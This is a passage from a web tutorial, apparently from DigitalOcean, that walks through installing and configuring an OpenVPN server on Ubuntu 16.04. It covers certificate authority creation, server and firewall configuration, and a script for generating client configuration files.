16.04</a></p>\r\n\r\n<h3>Introduction</h3>\r\n\r\n<p>Want to access the Internet safely and securely from your smartphone or laptop when connected to an untrusted network such as the WiFi of a hotel or coffee shop? A <a href=\"https://en.wikipedia.org/wiki/Virtual_private_network\">Virtual Private Network</a> (VPN) allows you to traverse untrusted networks privately and securely as if you were on a private network. The traffic emerges from the VPN server and continues its journey to the destination.</p>\r\n\r\n<p>When combined with <a href=\"https://en.wikipedia.org/wiki/HTTP_Secure\">HTTPS connections</a>, this setup allows you to secure your wireless logins and transactions. You can circumvent geographical restrictions and censorship, and shield your location and any unencrypted HTTP traffic from the untrusted network.</p>\r\n\r\n<p><a href=\"https://openvpn.net\">OpenVPN</a> is a full-featured open source Secure Socket Layer (SSL) VPN solution that accommodates a wide range of configurations. In this tutorial, we&#39;ll set up an OpenVPN server on a Droplet and then configure access to it from Windows, OS X, iOS and Android. This tutorial will keep the installation and configuration steps as simple as possible for these setups.</p>\r\n\r\n<h2>Prerequisites</h2>\r\n\r\n<p>To complete this tutorial, you will need access to an Ubuntu 16.04 server.</p>\r\n\r\n<p>You will need to configure a non-root user with <code>sudo</code> privileges before you start this guide. You can follow our <a href=\"https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-16-04\">Ubuntu 16.04 initial server setup guide</a> to set up a user with appropriate permissions. The linked tutorial will also set up a <strong>firewall</strong>, which we will assume is in place during this guide.</p>\r\n\r\n<p>When you are ready to begin, log into your Ubuntu server as your <code>sudo</code> user and continue below.</p>\r\n\r\n<h2>Step 1: Install OpenVPN</h2>\r\n\r\n<p>To start off, we will install OpenVPN onto our server. OpenVPN is available in Ubuntu&#39;s default repositories, so we can use <code>apt</code> for the installation. We will also be installing the <code>easy-rsa</code> package, which will help us set up an internal CA (certificate authority) for use with our VPN.</p>\r\n\r\n<p>To update your server&#39;s package index and install the necessary packages type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo apt-get update </code></li>\r\n	<li><code>sudo apt-get install openvpn easy-rsa </code></li>\r\n</ul>\r\n\r\n<p>The needed software is now on the server, ready to be configured.</p>\r\n\r\n<h2>Step 2: Set Up the CA Directory</h2>\r\n\r\n<p>OpenVPN is an TLS/SSL VPN. This means that it utilizes certificates in order to encrypt traffic between the server and clients. In order to issue trusted certificates, we will need to set up our own simple certificate authority (CA).</p>\r\n\r\n<p>To begin, we can copy the <code>easy-rsa</code> template directory into our home directory with the <code>make-cadir</code> command:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>make-cadir ~/openvpn-ca </code></li>\r\n</ul>\r\n\r\n<p>Move into the newly created directory to begin configuring the CA:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca </code></li>\r\n</ul>\r\n\r\n<h2>Step 3: Configure the CA Variables</h2>\r\n\r\n<p>To configure the values our CA will use, we need to edit the <code>vars</code> file within the directory. Open that file now in your text editor:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano vars </code></li>\r\n</ul>\r\n\r\n<p>Inside, you will find some variables that can be adjusted to determine how your certificates will be created. We only need to worry about a few of these.</p>\r\n\r\n<p>Towards the bottom of the file, find the settings that set field defaults for new certificates. It should look something like this:</p>\r\n\r\n<p>~/openvpn-ca/vars</p>\r\n\r\n<pre>\r\n<code>. . .\r\n\r\nexport KEY_COUNTRY=&quot;US&quot;\r\nexport KEY_PROVINCE=&quot;CA&quot;\r\nexport KEY_CITY=&quot;SanFrancisco&quot;\r\nexport KEY_ORG=&quot;Fort-Funston&quot;\r\nexport KEY_EMAIL=&quot;me@myhost.mydomain&quot;\r\nexport KEY_OU=&quot;MyOrganizationalUnit&quot;\r\n\r\n. . .\r\n</code></pre>\r\n\r\n<p>Edit the values in red to whatever you&#39;d prefer, but do not leave them blank:</p>\r\n\r\n<p>~/openvpn-ca/vars</p>\r\n\r\n<pre>\r\n<code>. . .\r\n\r\nexport KEY_COUNTRY=&quot;US&quot;\r\nexport KEY_PROVINCE=&quot;NY&quot;\r\nexport KEY_CITY=&quot;New York City&quot;\r\nexport KEY_ORG=&quot;DigitalOcean&quot;\r\nexport KEY_EMAIL=&quot;admin@example.com&quot;\r\nexport KEY_OU=&quot;Community&quot;\r\n\r\n. . .\r\n</code></pre>\r\n\r\n<p>While we are here, we will also edit the <code>KEY_NAME</code> value just below this section, which populates the subject field. To keep this simple, we&#39;ll call it <code>server</code> in this guide:</p>\r\n\r\n<p>~/openvpn-ca/vars</p>\r\n\r\n<pre>\r\n<code>export KEY_NAME=&quot;server&quot;\r\n</code></pre>\r\n\r\n<p>When you are finished, save and close the file.</p>\r\n\r\n<h2>Step 4: Build the Certificate Authority</h2>\r\n\r\n<p>Now, we can use the variables we set and the <code>easy-rsa</code> utilities to build our certificate authority.</p>\r\n\r\n<p>Ensure you are in your CA directory, and then source the <code>vars</code> file you just edited:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca </code></li>\r\n	<li><code>source vars </code></li>\r\n</ul>\r\n\r\n<p>You should see the following if it was sourced correctly:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>NOTE: If you run ./clean-all, I will be doing a rm -rf on /home/sammy/openvpn-ca/keys </code></p>\r\n\r\n<p>Make sure we&#39;re operating in a clean environment by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>./clean-all </code></li>\r\n</ul>\r\n\r\n<p>Now, we can build our root CA by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>./build-ca </code></li>\r\n</ul>\r\n\r\n<p>This will initiate the process of creating the root certificate authority key and certificate. Since we filled out the <code>vars</code> file, all of the values should be populated automatically. Just press <strong>ENTER</strong> through the prompts to confirm the selections:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>Generating a 2048 bit RSA private key ..........................................................................................+++ ...............................+++ writing new private key to &#39;ca.key&#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter &#39;.&#39;, the field will be left blank. ----- Country Name (2 letter code) [US]: State or Province Name (full name) [NY]: Locality Name (eg, city) [New York City]: Organization Name (eg, company) [DigitalOcean]: Organizational Unit Name (eg, section) [Community]: Common Name (eg, your name or your server&#39;s hostname) [DigitalOcean CA]: Name [server]: Email Address [admin@email.com]: </code></p>\r\n\r\n<p>We now have a CA that can be used to create the rest of the files we need.</p>\r\n\r\n<h2>Step 5: Create the Server Certificate, Key, and Encryption Files</h2>\r\n\r\n<p>Next, we will generate our server certificate and key pair, as well as some additional files used during the encryption process.</p>\r\n\r\n<p>Start by generating the OpenVPN server certificate and key pair. We can do this by typing:</p>\r\n\r\n<p><strong>Note</strong>: If you choose a name other than <code>server</code> here, you will have to adjust some of the instructions below. For instance, when copying the generated files to the <code>/etc/openvpn</code> directroy, you will have to substitute the correct names. You will also have to modify the <code>/etc/openvpn/server.conf</code> file later to point to the correct <code>.crt</code> and <code>.key</code> files.</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>./build-key-server server </code></li>\r\n</ul>\r\n\r\n<p>Once again, the prompts will have default values based on the argument we just passed in (<code>server</code>) and the contents of our <code>vars</code> file we sourced.</p>\r\n\r\n<p>Feel free to accept the default values by pressing <strong>ENTER</strong>. Do <em>not</em> enter a challenge password for this setup. Towards the end, you will have to enter <strong>y</strong> to two questions to sign and commit the certificate:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>. . . Certificate is to be certified until May 1 17:51:16 2026 GMT (3650 days) Sign the certificate? [y/n]:y 1 out of 1 certificate requests certified, commit? [y/n]y Write out database with 1 new entries Data Base Updated </code></p>\r\n\r\n<p>Next, we&#39;ll generate a few other items. We can generate a strong Diffie-Hellman keys to use during key exchange by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>./build-dh </code></li>\r\n</ul>\r\n\r\n<p>This might take a few minutes to complete.</p>\r\n\r\n<p>Afterwards, we can generate an HMAC signature to strengthen the server&#39;s TLS integrity verification capabilities:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>openvpn --genkey --secret keys/ta.key </code></li>\r\n</ul>\r\n\r\n<h2>Step 6: Generate a Client Certificate and Key Pair</h2>\r\n\r\n<p>Next, we can generate a client certificate and key pair. Although this can be done on the client machine and then signed by the server/CA for security purposes, for this guide we will generate the signed key on the server for the sake of simplicity.</p>\r\n\r\n<p>We will generate a single client key/certificate for this guide, but if you have more than one client, you can repeat this process as many times as you&#39;d like. Pass in a unique value to the script for each client.</p>\r\n\r\n<p>Because you may come back to this step at a later time, we&#39;ll re-source the <code>vars</code> file. We will use <code>client1</code> as the value for our first certificate/key pair for this guide.</p>\r\n\r\n<p>To produce credentials without a password, to aid in automated connections, use the <code>build-key</code> command like this:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca </code></li>\r\n	<li><code>source vars </code></li>\r\n	<li><code>./build-key client1 </code></li>\r\n</ul>\r\n\r\n<p>If instead, you wish to create a password-protected set of credentials, use the <code>build-key-pass</code> command:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca </code></li>\r\n	<li><code>source vars </code></li>\r\n	<li><code>./build-key-pass client1 </code></li>\r\n</ul>\r\n\r\n<p>Again, the defaults should be populated, so you can just hit <strong>ENTER</strong> to continue. Leave the challenge password blank and make sure to enter <strong>y</strong> for the prompts that ask whether to sign and commit the certificate.</p>\r\n\r\n<h2>Step 7: Configure the OpenVPN Service</h2>\r\n\r\n<p>Next, we can begin configuring the OpenVPN service using the credentials and files we&#39;ve generated.</p>\r\n\r\n<h3>Copy the Files to the OpenVPN Directory</h3>\r\n\r\n<p>To begin, we need to copy the files we need to the <code>/etc/openvpn</code> configuration directory.</p>\r\n\r\n<p>We can start with all of the files that we just generated. These were placed within the <code>~/openvpn-ca/keys</code> directory as they were created. We need to move our CA cert, our server cert and key, the HMAC signature, and the Diffie-Hellman file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca/keys </code></li>\r\n	<li><code>sudo cp ca.crt server.crt server.key ta.key dh2048.pem /etc/openvpn </code></li>\r\n</ul>\r\n\r\n<p>Next, we need to copy and unzip a sample OpenVPN configuration file into configuration directory so that we can use it as a basis for our setup:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>gunzip -c /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz | sudo tee /etc/openvpn/server.conf </code></li>\r\n</ul>\r\n\r\n<h3>Adjust the OpenVPN Configuration</h3>\r\n\r\n<p>Now that our files are in place, we can modify the server configuration file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/openvpn/server.conf </code></li>\r\n</ul>\r\n\r\n<p>Basic Configuration</p>\r\n\r\n<p>First, find the HMAC section by looking for the <code>tls-auth</code> directive. Remove the &quot;<strong>;</strong>&quot; to uncomment the <code>tls-auth</code> line. Below this, add the <code>key-direction</code> parameter set to &quot;0&quot;:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>tls-auth ta.key 0 # This file is secret\r\nkey-direction 0\r\n</code></pre>\r\n\r\n<p>Next, find the section on cryptographic ciphers by looking for the commented out <code>cipher</code> lines. The <code>AES-128-CBC</code> cipher offers a good level of encryption and is well supported. Remove the &quot;<strong>;</strong>&quot; to uncomment the <code>cipher AES-128-CBC</code> line:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>cipher AES-128-CBC\r\n</code></pre>\r\n\r\n<p>Below this, add an <code>auth</code> line to select the HMAC message digest algorithm. For this, <code>SHA256</code> is a good choice:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>auth SHA256\r\n</code></pre>\r\n\r\n<p>Finally, find the <code>user</code> and <code>group</code> settings and remove the &quot;<strong>;</strong>&quot; at the beginning of to uncomment those lines:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>user nobody\r\ngroup nogroup\r\n</code></pre>\r\n\r\n<p>(Optional) Push DNS Changes to Redirect All Traffic Through the VPN</p>\r\n\r\n<p>The settings above will create the VPN connection between the two machines, but will not force any connections to use the tunnel. If you wish to use the VPN to route all of your traffic, you will likely want to push the DNS settings to the client computers.</p>\r\n\r\n<p>You can do this, uncomment a few directives that will configure client machines to redirect all web traffic through the VPN. Find the <code>redirect-gateway</code> section and remove the semicolon &quot;<strong>;</strong>&quot; from the beginning of the <code>redirect-gateway</code> line to uncomment it:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>push &quot;redirect-gateway def1 bypass-dhcp&quot;\r\n</code></pre>\r\n\r\n<p>Just below this, find the <code>dhcp-option</code> section. Again, remove the &quot;<strong>;</strong>&quot; from in front of both of the lines to uncomment them:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>push &quot;dhcp-option DNS 208.67.222.222&quot;\r\npush &quot;dhcp-option DNS 208.67.220.220&quot;\r\n</code></pre>\r\n\r\n<p>This should assist clients in reconfiguring their DNS settings to use the VPN tunnel for as the default gateway.</p>\r\n\r\n<p>(Optional) Adjust the Port and Protocol</p>\r\n\r\n<p>By default, the OpenVPN server uses port 1194 and the UDP protocol to accept client connections. If you need to use a different port because of restrictive network environments that your clients might be in, you can change the <code>port</code> option. If you are not hosting web content your OpenVPN server, port 443 is a popular choice since this is usually allowed through firewall rules.</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code># Optional!\r\nport 443\r\n</code></pre>\r\n\r\n<p>Often if the protocol will be restricted to that port as well. If so, change <code>proto</code> from UDP to TCP:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code># Optional!\r\nproto tcp\r\n</code></pre>\r\n\r\n<p>If you have no need to use a different port, it is best to leave these two settings as their default.</p>\r\n\r\n<p>(Optional) Point to Non-Default Credentials</p>\r\n\r\n<p>If you selected a different name during the <code>./build-key-server</code> command earlier, modify the <code>cert</code> and <code>key</code> lines that you see to point to the appropriate <code>.crt</code> and <code>.key</code> files. If you used the default <code>server</code>, this should already be set correctly:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>cert server.crt\r\nkey server.key\r\n</code></pre>\r\n\r\n<p>When you are finished, save and close the file.</p>\r\n\r\n<h2>Step 8: Adjust the Server Networking Configuration</h2>\r\n\r\n<p>Next, we need to adjust some aspects of the server&#39;s networking so that OpenVPN can correctly route traffic.</p>\r\n\r\n<h3>Allow IP Forwarding</h3>\r\n\r\n<p>First, we need to allow the server to forward traffic. This is fairly essential to the functionality we want our VPN server to provide.</p>\r\n\r\n<p>We can adjust this setting by modifying the <code>/etc/sysctl.conf</code> file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/sysctl.conf </code></li>\r\n</ul>\r\n\r\n<p>Inside, look for the line that sets <code>net.ipv4.ip_forward</code>. Remove the &quot;<strong>#</strong>&quot; character from the beginning of the line to uncomment that setting:</p>\r\n\r\n<p>/etc/sysctl.conf</p>\r\n\r\n<pre>\r\n<code>net.ipv4.ip_forward=1\r\n</code></pre>\r\n\r\n<p>Save and close the file when you are finished.</p>\r\n\r\n<p>To read the file and adjust the values for the current session, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo sysctl -p </code></li>\r\n</ul>\r\n\r\n<h3>Adjust the UFW Rules to Masquerade Client Connections</h3>\r\n\r\n<p>If you followed the Ubuntu 16.04 initial server setup guide in the prerequisites, you should have the UFW firewall in place. Regardless of whether you use the firewall to block unwanted traffic (which you almost always should do), we need the firewall in this guide to manipulate some of the traffic coming into the server. We need to modify the rules file to set up masquerading, an <code>iptables</code> concept that provides on-the-fly dynamic NAT to correctly route client connections.</p>\r\n\r\n<p>Before we open the firewall configuration file to add masquerading, we need to find the public network interface of our machine. To do this, type:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>ip route | grep default </code></li>\r\n</ul>\r\n\r\n<p>Your public interface should follow the word &quot;dev&quot;. For example, this result shows the interface named <code>wlp11s0</code>, which is highlighted below:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>default via 203.0.113.1 dev wlp11s0 proto static metric 600 </code></p>\r\n\r\n<p>When you have the interface associated with your default route, open the <code>/etc/ufw/before.rules</code> file to add the relevant configuration:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/ufw/before.rules </code></li>\r\n</ul>\r\n\r\n<p>This file handles configuration that should be put into place before the conventional UFW rules are loaded. Towards the top of the file, add the highlighted lines below. This will set the default policy for the <code>POSTROUTING</code> chain in the <code>nat</code> table and masquerade any traffic coming from the VPN:</p>\r\n\r\n<p><strong>Note</strong>: Remember to replace <code>wlp11s0</code> in the <code>-A POSTROUTING</code> line below with the interface you found in the above command.</p>\r\n\r\n<p>/etc/ufw/before.rules</p>\r\n\r\n<pre>\r\n<code>#\r\n# rules.before\r\n#\r\n# Rules that should be run before the ufw command line added rules. Custom\r\n# rules should be added to one of these chains:\r\n#   ufw-before-input\r\n#   ufw-before-output\r\n#   ufw-before-forward\r\n#\r\n\r\n# START OPENVPN RULES\r\n# NAT table rules\r\n*nat\r\n:POSTROUTING ACCEPT [0:0] \r\n# Allow traffic from OpenVPN client to wlp11s0 (change to the interface you discovered!)\r\n-A POSTROUTING -s 10.8.0.0/8 -o wlp11s0 -j MASQUERADE\r\nCOMMIT\r\n# END OPENVPN RULES\r\n\r\n# Don&#39;t delete these required lines, otherwise there will be errors\r\n*filter\r\n. . .\r\n</code></pre>\r\n\r\n<p>Save and close the file when you are finished.</p>\r\n\r\n<p>We need to tell UFW to allow forwarded packets by default as well. To do this, we will open the <code>/etc/default/ufw</code> file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/default/ufw </code></li>\r\n</ul>\r\n\r\n<p>Inside, find the <code>DEFAULT_FORWARD_POLICY</code> directive. We will change the value from <code>DROP</code> to <code>ACCEPT</code>:</p>\r\n\r\n<p>/etc/default/ufw</p>\r\n\r\n<pre>\r\n<code>DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;\r\n</code></pre>\r\n\r\n<p>Save and close the file when you are finished.</p>\r\n\r\n<h3>Open the OpenVPN Port and Enable the Changes</h3>\r\n\r\n<p>Next, we&#39;ll adjust the firewall itself to allow traffic to OpenVPN.</p>\r\n\r\n<p>If you did not change the port and protocol in the <code>/etc/openvpn/server.conf</code> file, you will need to open up UDP traffic to port 1194. If you modified the port and/or protocol, substitute the values you selected here.</p>\r\n\r\n<p>We&#39;ll also add the SSH port in case you forgot to add it when following the prerequisite tutorial:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo ufw allow 1194/udp </code></li>\r\n	<li><code>sudo ufw allow OpenSSH </code></li>\r\n</ul>\r\n\r\n<p>Now, we can disable and re-enable UFW to load the changes from all of the files we&#39;ve modified:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo ufw disable </code></li>\r\n	<li><code>sudo ufw enable </code></li>\r\n</ul>\r\n\r\n<p>Our server is now configured to correctly handle OpenVPN traffic.</p>\r\n\r\n<h2>Step 9: Start and Enable the OpenVPN Service</h2>\r\n\r\n<p>We&#39;re finally ready to start the OpenVPN service on our server. We can do this using systemd.</p>\r\n\r\n<p>We need to start the OpenVPN server by specifying our configuration file name as an instance variable after the systemd unit file name. Our configuration file for our server is called <code>/etc/openvpn/server.conf</code>, so we will add <code>@server</code> to end of our unit file when calling it:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl start openvpn@server </code></li>\r\n</ul>\r\n\r\n<p>Double-check that the service has started successfully by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl status openvpn@server </code></li>\r\n</ul>\r\n\r\n<p>If everything went well, your output should look something that looks like this:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>● openvpn@server.service - OpenVPN connection to server Loaded: loaded (/lib/systemd/system/openvpn@.service; disabled; vendor preset: enabled) Active: active (running) since Tue 2016-05-03 15:30:05 EDT; 47s ago Docs: man:openvpn(8) https://community.openvpn.net/openvpn/wiki/Openvpn23ManPage https://community.openvpn.net/openvpn/wiki/HOWTO Process: 5852 ExecStart=/usr/sbin/openvpn --daemon ovpn-%i --status /run/openvpn/%i.status 10 --cd /etc/openvpn --script-security 2 --config /etc/openvpn/%i.conf --writepid /run/openvpn/%i.pid (code=exited, sta Main PID: 5856 (openvpn) Tasks: 1 (limit: 512) CGroup: /system.slice/system-openvpn.slice/openvpn@server.service └─5856 /usr/sbin/openvpn --daemon ovpn-server --status /run/openvpn/server.status 10 --cd /etc/openvpn --script-security 2 --config /etc/openvpn/server.conf --writepid /run/openvpn/server.pid May 03 15:30:05 openvpn2 ovpn-server[5856]: /sbin/ip addr add dev tun0 local 10.8.0.1 peer 10.8.0.2 May 03 15:30:05 openvpn2 ovpn-server[5856]: /sbin/ip route add 10.8.0.0/24 via 10.8.0.2 May 03 15:30:05 openvpn2 ovpn-server[5856]: GID set to nogroup May 03 15:30:05 openvpn2 ovpn-server[5856]: UID set to nobody May 03 15:30:05 openvpn2 ovpn-server[5856]: UDPv4 link local (bound): [undef] May 03 15:30:05 openvpn2 ovpn-server[5856]: UDPv4 link remote: [undef] May 03 15:30:05 openvpn2 ovpn-server[5856]: MULTI: multi_init called, r=256 v=256 May 03 15:30:05 openvpn2 ovpn-server[5856]: IFCONFIG POOL: base=10.8.0.4 size=62, ipv6=0 May 03 15:30:05 openvpn2 ovpn-server[5856]: IFCONFIG POOL LIST May 03 15:30:05 openvpn2 ovpn-server[5856]: Initialization Sequence Completed </code></p>\r\n\r\n<p>You can also check that the OpenVPN <code>tun0</code> interface is available by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>ip addr show tun0 </code></li>\r\n</ul>\r\n\r\n<p>You should see a configured interface:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>4: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UNKNOWN group default qlen 100 link/none inet 10.8.0.1 peer 10.8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever </code></p>\r\n\r\n<p>If everything went well, enable the service so that it starts automatically at boot:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl enable openvpn@server </code></li>\r\n</ul>\r\n\r\n<h2>Step 10: Create Client Configuration Infrastructure</h2>\r\n\r\n<p>Next, we need to set up a system that will allow us to create client configuration files easily.</p>\r\n\r\n<h3>Creating the Client Config Directory Structure</h3>\r\n\r\n<p>Create a directory structure within your home directory to store the files:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>mkdir -p ~/client-configs/files </code></li>\r\n</ul>\r\n\r\n<p>Since our client configuration files will have the client keys embedded, we should lock down permissions on our inner directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>chmod 700 ~/client-configs/files </code></li>\r\n</ul>\r\n\r\n<h3>Creating a Base Configuration</h3>\r\n\r\n<p>Next, let&#39;s copy an example client configuration into our directory to use as our base configuration:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf ~/client-configs/base.conf </code></li>\r\n</ul>\r\n\r\n<p>Open this new file in your text editor:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano ~/client-configs/base.conf </code></li>\r\n</ul>\r\n\r\n<p>Inside, we need to make a few adjustments.</p>\r\n\r\n<p>First, locate the <code>remote</code> directive. This points the client to our OpenVPN server address. This should be the public IP address of your OpenVPN server. If you changed the port that the OpenVPN server is listening on, change <code>1194</code> to the port you selected:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code>. . .\r\n# The hostname/IP and port of the server.\r\n# You can have multiple remote entries\r\n# to load balance between the servers.\r\nremote server_IP_address 1194\r\n. . .\r\n</code></pre>\r\n\r\n<p>Be sure that the protocol matches the value you are using in the server configuration:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code>proto udp\r\n</code></pre>\r\n\r\n<p>Next, uncomment the <code>user</code> and <code>group</code> directives by removing the &quot;<strong>;</strong>&quot;:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code># Downgrade privileges after initialization (non-Windows only)\r\nuser nobody\r\ngroup nogroup\r\n</code></pre>\r\n\r\n<p>Find the directives that set the <code>ca</code>, <code>cert</code>, and <code>key</code>. Comment out these directives since we will be adding the certs and keys within the file itself:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code># SSL/TLS parms.\r\n# See the server config file for more\r\n# description.  It&#39;s best to use\r\n# a separate .crt/.key file pair\r\n# for each client.  A single ca\r\n# file can be used for all clients.\r\n#ca ca.crt\r\n#cert client.crt\r\n#key client.key\r\n</code></pre>\r\n\r\n<p>Mirror the <code>cipher</code> and <code>auth</code> settings that we set in the <code>/etc/openvpn/server.conf</code> file:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code>cipher AES-128-CBC\r\nauth SHA256\r\n</code></pre>\r\n\r\n<p>Next, add the <code>key-direction</code> directive somewhere in the file. This <strong>must</strong> be set to &quot;1&quot; to work with the server:</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code>key-direction 1\r\n</code></pre>\r\n\r\n<p>Finally, add a few <strong>commented out</strong> lines. We want to include these with every config, but should only enable them for Linux clients that ship with a <code>/etc/openvpn/update-resolv-conf</code> file. This script uses the <code>resolvconf</code> utility to update DNS information for Linux clients.</p>\r\n\r\n<p>~/client-configs/base.conf</p>\r\n\r\n<pre>\r\n<code># script-security 2\r\n# up /etc/openvpn/update-resolv-conf\r\n# down /etc/openvpn/update-resolv-conf\r\n</code></pre>\r\n\r\n<p>If your client is running Linux and has an <code>/etc/openvpn/update-resolv-conf</code> file, you should uncomment these lines from the generated OpenVPN client configuration file.</p>\r\n\r\n<p>Save the file when you are finished.</p>\r\n\r\n<h3>Creating a Configuration Generation Script</h3>\r\n\r\n<p>Next, we will create a simple script to compile our base configuration with the relevant certificate, key, and encryption files. This will place the generated configuration in the <code>~/client-configs/files</code> directory.</p>\r\n\r\n<p>Create and open a file called <code>make_config.sh</code> within the <code>~/client-configs</code> directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano ~/client-configs/make_config.sh </code></li>\r\n</ul>\r\n\r\n<p>Inside, paste the following script:</p>\r\n\r\n<p>~/client-configs/make_config.sh</p>\r\n\r\n<pre>\r\n<code>#!/bin/bash\r\n\r\n# First argument: Client identifier\r\n\r\nKEY_DIR=~/openvpn-ca/keys\r\nOUTPUT_DIR=~/client-configs/files\r\nBASE_CONFIG=~/client-configs/base.conf\r\n\r\ncat ${BASE_CONFIG} \\\r\n    &lt;(echo -e &#39;&lt;ca&gt;&#39;) \\\r\n    ${KEY_DIR}/ca.crt \\\r\n    &lt;(echo -e &#39;&lt;/ca&gt;\\n&lt;cert&gt;&#39;) \\\r\n    ${KEY_DIR}/${1}.crt \\\r\n    &lt;(echo -e &#39;&lt;/cert&gt;\\n&lt;key&gt;&#39;) \\\r\n    ${KEY_DIR}/${1}.key \\\r\n    &lt;(echo -e &#39;&lt;/key&gt;\\n&lt;tls-auth&gt;&#39;) \\\r\n    ${KEY_DIR}/ta.key \\\r\n    &lt;(echo -e &#39;&lt;/tls-auth&gt;&#39;) \\\r\n    &gt; ${OUTPUT_DIR}/${1}.ovpn\r\n</code></pre>\r\n\r\n<p>Save and close the file when you are finished.</p>\r\n\r\n<p>Mark the file as executable by 